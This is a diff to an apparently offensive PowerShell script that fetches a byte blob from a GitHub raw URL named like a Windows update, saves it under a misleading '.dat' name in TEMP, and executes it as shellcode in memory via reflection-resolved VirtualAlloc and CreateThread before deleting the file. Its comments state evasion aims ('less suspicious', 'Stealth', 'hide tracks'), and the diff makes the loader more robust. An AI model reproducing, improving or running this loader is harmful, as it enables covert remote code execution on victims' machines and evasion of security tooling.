@@ -1,40 +1,50 @@
 # 1. Paths and URLs
-$htmlPath = "$env:TEMP\test.html" # Using TEMP is less suspicious than Downloads
+$htmlPath = "$env:TEMP\update_cache.dat" # Renamed to .dat for less suspicion
 $htmlUrl = "https://raw.githubusercontent.com/gwyn1869/winupdate/main/test.html"
 
 # 2. Download the HTML Blob
+# Using -UseBasicParsing to avoid IE engine dependency
 Invoke-WebRequest -Uri $htmlUrl -OutFile $htmlPath -UseBasicParsing
 
 # 3. Extract and Reassemble the Byte Array
 $htmlContent = Get-Content $htmlPath -Raw
 $pattern = '(?<=dmr)(.*?)(?=dmr)'
 $match = [regex]::Match($htmlContent, $pattern).Value
-$byteArray = $match.Split("dmr") | ForEach-Object { [byte]$_ }
+if (-not $match) { Write-Error "Blob not found!"; exit }
 
-# 4. The Shellcode Loader (Runs in RAM)
-$Ptr = [System.Runtime.InteropServices.Marshal]
-$Win32Func = [Ref].Assembly.GetType('Microsoft.Win32.Win32Native')
-$GetProcAddress = $Win32Func.GetMethod('GetProcAddress', [Reflection.BindingFlags] 'Static, NonPublic')
-$GetModuleHandle = $Win32Func.GetMethod('GetModuleHandle', [Reflection.BindingFlags] 'Static, NonPublic')
+# Split by your 'dmr' delimiter and convert to actual bytes
+$byteArray = $match.Split("dmr") | Where-Object { $_ -ne "" } | ForEach-Object { [byte]$_ }
 
-# 2. Find VirtualAlloc and CreateThread manually
-$Kern32 = $GetModuleHandle.Invoke($null, @("kernel32.dll"))
-$VAllocAddr = $GetProcAddress.Invoke($null, @($Kern32, "VirtualAlloc"))
-$CThreadAddr = $GetProcAddress.Invoke($null, @($Kern32, "CreateThread"))
+# 4. The Stealth Shellcode Loader (Reflection)
+# This part finds the memory addresses of Windows APIs without using Add-Type
+$Domain = [AppDomain]::CurrentDomain.GetAssemblies()
+$Kernel32 = $Domain | Where-Object { $_.FullName -contains "mscorlib" } | ForEach-Object { $_.GetType("Microsoft.Win32.Win32Native") }
 
-# 3. Create delegates to call them (This avoids Add-Type)
-$VAllocDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VAllocAddr, [Func[IntPtr, UInt32, UInt32, UInt32, IntPtr]])
-$CThreadDelegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CThreadAddr, [Func[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])
+# Get Method Handles
+$GetModuleHandle = $Kernel32.GetMethod("GetModuleHandle", [Reflection.BindingFlags]"Static, Public, NonPublic")
+$GetProcAddress = $Kernel32.GetMethod("GetProcAddress", [Reflection.BindingFlags]"Static, Public, NonPublic")
 
-# 4. Use the delegates
+# Invoke Handles to get API Addresses
+$hKernel32 = $GetModuleHandle.Invoke($null, @("kernel32.dll"))
+$vAllocAddr = $GetProcAddress.Invoke($null, @($hKernel32, "VirtualAlloc"))
+$cThreadAddr = $GetProcAddress.Invoke($null, @($hKernel32, "CreateThread"))
+
+# Create Delegate Types (The "Magic" to call the APIs)
+$DelegateVirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vAllocAddr, [Func[IntPtr, UInt32, UInt32, UInt32, IntPtr]])
+$DelegateCreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($cThreadAddr, [Func[IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr, IntPtr]])
+
+# 5. Allocate, Copy, and Execute
 $size = [uint32]$byteArray.Length
-$address = $VAllocDelegate.Invoke([IntPtr]::Zero, $size, 0x3000, 0x40)
+# Allocate Memory: 0x3000 (Commit+Reserve), 0x40 (ExecuteReadWrite)
+$address = $DelegateVirtualAlloc.Invoke([IntPtr]::Zero, $size, 0x3000, 0x40)
 
-# Copy Shellcode to Allocated Memory
-[System.Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $address, $size)
+if ($address -ne [IntPtr]::Zero) {
+    # Copy Byte Array to RAM
+    [System.Runtime.InteropServices.Marshal]::Copy($byteArray, 0, $address, $size)
 
-# Execute the Shellcode as a new Thread
-$kernel32::CreateThread([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+    # Execute as a new thread
+    $DelegateCreateThread.Invoke([IntPtr]::Zero, 0, $address, [IntPtr]::Zero, 0, [IntPtr]::Zero) | Out-Null
+}
 
-# Cleanup the HTML file to hide tracks
+# 6. Cleanup
 Remove-Item $htmlPath -Force
